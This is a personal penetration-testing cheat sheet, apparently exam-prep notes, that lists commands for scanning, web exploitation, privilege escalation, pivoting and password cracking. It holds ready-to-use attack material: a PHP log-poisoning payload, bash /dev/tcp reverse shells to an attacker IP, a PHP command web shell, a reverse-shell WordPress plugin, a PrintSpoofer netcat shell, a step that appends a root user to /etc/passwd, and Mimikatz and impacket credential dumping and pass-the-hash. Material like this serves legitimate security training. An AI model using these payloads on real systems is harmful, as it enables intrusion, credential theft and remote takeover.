### Disclaimer - This page is meant as a personal reference page; there exist better places on the internet to learn penetration testing concepts and commands. 

# Preliminary Scanning 
## nmap
-   Basic scan - Nmap $IP
	- Checks 1000 most common ports
-   Then more detailed - Nmap -A -p $IP
	- Where the open ports from the previous scan follow the -p flag
	- Ex: -p22,80,445
-   Nmap -p- $IP
	- Checks all ports - run this after getting started on the first scan because it takes a while
-   Nmap -sU $IP
- Nmap Scripting Engine
	- The nmap scripting engine can also be used for more thorough scanning
	- nmap --script=\<script1>\.nse, \<script2>\.nse $IP
		- Find scripts: grep \<search term>\ /usr/share/nmap/scripts/*.nse
		- Help on script: nmap --script-help=\<script.nse>
## nmapautomator
- https://github.com/21y4d/nmapAutomator
- ./nmapAutomator.sh --host \<Target IP> --type All (or Network/Port/Script/Full/UDP/Vulns/Recon)
# Web
## Directory Scanning
### Gobuster
- gobuster dir -u http://host -w /usr/share/wordlists/$wordlist.txt
- EX: gobuster dir -u http://host -w /usr/share/wordlists/dirb/common.txt -t 5
- gobuster dir -u http://hosts -w /wordlists/Discovery/Web-Content/big.txt -t 4 --delay 1s -o results.txt
	- Where the resulting output is called results.txt
- gobuster dir -u https://host -w /wordlists/$wordlist.txt  -x .php, .txt  -t 4
	- Where you are searching for php and txt files
### feroxbuster 
- feroxbuster -u \<url>
- feroxbuster -u \<url> -w \<wordlists>
- feroxbuster -u \<url> -t \<number_of_threads>
- feroxbuster -u \<url> --timeout \<timeout_in_seconds>
- feroxbuster -u \<url> --filter-status 404,403,400 --thorough -r
- feroxbuster -u \<url>:\<alternative port>

## Directory Traversal
On Linux, we can use the /etc/passwd file to test directory traversal vulnerabilities. On Windows, we can use the file C:\Windows\System32\drivers\etc\hosts to test directory traversal vulnerabilities, which is readable by all local users. In Linux systems, a standard vector for directory traversal is to list the users of the system by displaying the contents of /etc/passwd. Check for private keys in their home directory, and use them to access the system via SSH.

## XSS

## SQLi

## LFI
- Executing a file on the server, though we may have to modify it first somehow.  
- Ex: if the server stores access logs, modify the access log such that it contains our code, perhaps in the user agent field.
	1. Change this: "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
Firefox/91.0"
	2. To this: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
	3. Then change the request to include "cmd=ls" to test
	4. \<server>/file.php?page=. . / . ./log&cmd=ls 
	- Note that it may need to be URL encoded if your command contains spaces i.e. ls&20-la for "ls -la"
	5. Then one liner shell:
		- bash -c "bash -i >& /dev/tcp/\<kali IP>/\<kali port> 0>&1"
		- URL encoded though
	- On a Windows target running XAMPP, the Apache logs can be found in C:\xampp\apache\logs\.
	- On a Linux target Apache’s access.log file can be found in the /var/log/apache2/ directory.
- There are other examples of LFI, including uploading a reverse shell to a web application and calling it through the URL. The above is just one example of the concept. 

## RFI
- Executing on our file on the server. 
- In PHP web applications, the allow_url_include option needs to be enabled to leverage RFI. This is rare and disabled by default in current versions of PHP
	- [Example backdoor script](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/php/simple-backdoor.php):
    <?php

	    if(isset($_REQUEST['cmd'])){
	            echo "<pre>";
	            $cmd = ($_REQUEST['cmd']);
	            system($cmd);
	            echo "</pre>";
	            die;
	    }
	    ?>
	- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
	- curl"\<target>/index.php?page=http://\<kali server>/backdoor.php&cmd=ls"



# SQL
## mysql
- From kali: mysql --host <IP> -u root -proot
	- note that there is no space between -p flag and password
- From target: mysql -u root -p root

## mssql

# SMB
- smbclient -L \<target> -U \<user>
- smbclient //\<target>/\<share> -U \<user>%\<password>
- smbclient //\<target>/\<share> -U \<user> --pw-nt-hash \<NTLM hash>
- smbclient //\<target>/\<share> --directory path/to/directory --command "get file.txt"
	- to download file
- smbclient //\<target>/\<share> --directory path/to/directory --command "put file.txt"
	- to upload file
# SMTP
### onesixtyone
- onesixtyone -c \<file containing community strings (public, private, manager)> -i \<file containing target ips>
- Note that there are seclists with common community strings
	- SecLists/Miscellaneous/wordlist-common-snmp-community-strings.txt
	- SecLists/Miscellaneous/snmp.txt
### snmpwalk
- snmpwalk -c public -v1 -t 10 \<target ip>
	- other community strings besides public include private and manager
- snmpwalk -c public -v1 192.168.50.151 \<OID string>

	|OID| Target |
	|--|--|
	| 1.3.6.1.2.1.25.1.6.0 | System Processes |
	| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
	| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path |
	| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units |
	| 1.3.6.1.2.1.25.6.3.1.2  | Software Name |
	| 1.3.6.1.4.1.77.1.2.25 | User Accounts |
	| 1.3.6.1.2.1.6.13.1.3 | TCP Local Ports |
- snmpwalk -Os -c public -v 1 \<host> system
	- to retrieve all
	- try 'v 2c' as well 

# Windows Foothold
## Enumeration
### cmd
### Powershell
### winpeas.exe
## Active Directory

## Privilege Escalation
### Mimikatz
 1. privilege::debug
 2. token::elevate
 3. lsadump::sam
 4. sekurlsa::logonpasswords
 5. lsadump::dcsync /user:\<domain>\\\<user> (to obtain NTLM hash)
	 -  impacket-secretsdump -just-dc-user <user> \<domain.com>/\<user>:"\<password>"@\<ip>
	 - impacket-psexec -hashes 00000000000000000000000000000000:\<NTLM hash> Administrator@\<IP> 

### Potato Family
-PrintSpoofer: .\PrintSpoofer.exe -c "nc.exe \<kali $IP> \<listening port> -e cmd"
  

# Linux Foothold
## Enumeration
- id
- cat /etc/passwd
	- If you can somehow edit:
	- openssl passwd \<new password>
	- echo "\<new user>:\<hash from above>:0:0:root:/root:/bin/bash" >> /etc/passwd
	-  or simply copy \<hash from above> into root:<this spot>:etc within the /etc/passwd file
- cat /etc/issue
- uname -a
- hostname
- ps -aux
	- watch -n 1 "ps -aux | grep pass"
- ipconfig
- ss -anp or netstat
- dpkg -l (to list applications installed by dpkg)
- find / -writable -type d 2>/dev/null (find writable directories)
- cat any /home/.history files
- check /home/.ssh for keys
- su root (can't hurt to try)
- sudo tcpdump -i lo -A | grep "pass"

## Privilege Escalation
### Automated tools
- linpeas.sh
- unix-privesc-check
### SUID Executables - taken from [here](https://medium.com/@balathebug/linux-privilege-escalation-by-using-suid-19d37821ed12)
- find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
- find / -uid 0 -perm -4000 -type f 2>/dev/null
OR
- find / -perm -u=s -type f 2>/dev/null
OR
- find / -user root -perm -4000 -print 2>/dev/null
- find / -perm -u=s -type f 2>/dev/null
- find / -user root -perm -4000 -exec ls -ldb {} \;

# Port Forwarding
## Ligolo
- From Kali:
	- sudo ip tuntap add user pop mode tun ligolo
	- sudo ip link set ligolo up
	- sudo ip route add \<target ip.0/24> dev ligolo
	- ./proxy -selfcert
- From Windows Target (agent file):
	- .\ligolo.exe -connect \<kali IP>:11601 -ignore-cert
- From Linux Target (agent file):
	- ligolo -connect \<kali IP>:11601 -ignore-cert
- Then from Kali:
	- Session
	- 1
	- Start
	- listener_add --addr 0.0.0.0:5555 --to 127.0.0.1:6666
		- This allows you to access port 5555 on target from 127.0.0.1:6666 (kali machine)

# File Sharing
### Python server
- From kali: python3 -m http.server \<serving port>
- From target Windows: 
	- powershell - iwr -uri http://\<kali IP>:\<serving port>/file -outfile file
- From target Linux:
	- wget http://\<kali IP>:\<serving port>/file
### Over RDP
- xfreerdp /u:admin /p:password /v:10.10.172.151 /drive:\/<directory>,\<name>
### SMB
- From kali: 
	- sudo impacket-smbserver -smb2support share . -username <kali user> -password <kali pass>
- From target:  
	- net use m: \\\<kali IP>\share /user:<kali user> <kali pass>
	- copy/get file.txt m:\
### SSH/SCP
scp -P \<ssh port> \<file to copy> user@\<destination IP>:\<destination folder>
  

# Tool Syntax
## Crackmapexec
## Impacket
## Metasploit

## Password Attacks
### Hydra
- hydra -l \<user> -P /usr/share/wordlists/rockyou.txt -s \<alternate port> ssh://$IP
- hydra -L /usr/share/wordlists/dirb/others/names.txt -p "\<found password>" rdp://$IP
- hydra -l \<user>-P /usr/share/wordlists/rockyou.txt $IP http-post-form " /index.php:fm_usr=user&fm_pwd=\^PASS^:Login failed. Invalid"
- Basic Auth
	- hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.206.201 http-get
### Hashcat
- hashcat -m 0 \<hashfile> /usr/share/wordlists/rockyou.txt -r 15222.rule --force --show
- hashcat -m 13400 \<keepass hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force --show
- check hashcat for which mode to use (searching for KeePass in this case)
	- hashcat --help | grep -i "KeePass" 
	- hashcat -h | grep -i "ssh"
### john the ripper
- ssh2john id_rsa > ssh.hash 
- keepass2john \<database_name>.kdbx > keepass1.hash
## ssh
### creating ssh key
- ssh-keygen
- ssh -p 2222(unless 22) -i created_key(no pub) user@host.com
- Using a -d_sa (private key) from /home/user/.ssh/id_sa
### Finding key protected by password: if ssh key protected by a password
1. may need to chmod 600 id_rsa (too many permissions won't work)
2. ssh2john id_rsa > ssh.hash
3. remove "id_rsa:" from ssh.hash
4. hashcat -h | grep -i "ssh" (22921 for example)
5. hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force

## Swaks
- swaks --to <recipient@email.com> --from <sender@email.com> -ap --attach @<attachment> --server \<mail server ip> --body "message" --header "Subject: Subject" --suppress-data
	- You will need the password of the mail server user (likely the sender)
	- Note that the mail server may not be the same machine as the user who opens the email
## Wordpress Cheatsheet
### wpscan
- wpscan --url http://\<url --api-token \<APItoken>
### reverse shell Wordpress plugin

	    <?php
	    
	    /**
	    * Plugin Name: Reverse Shell Plugin
	    * Plugin URI:
	    * Description: Reverse Shell Plugin
	    * Version: 1.0
	    * Author: Vince Matteo
	    * Author URI: http://www.sevenlayers.com
	    */
	    
	    exec("/bin/bash -c 'bash -i >& /dev/tcp/<kali_IP>/<kali_port> 0>&1'");
	    ?>












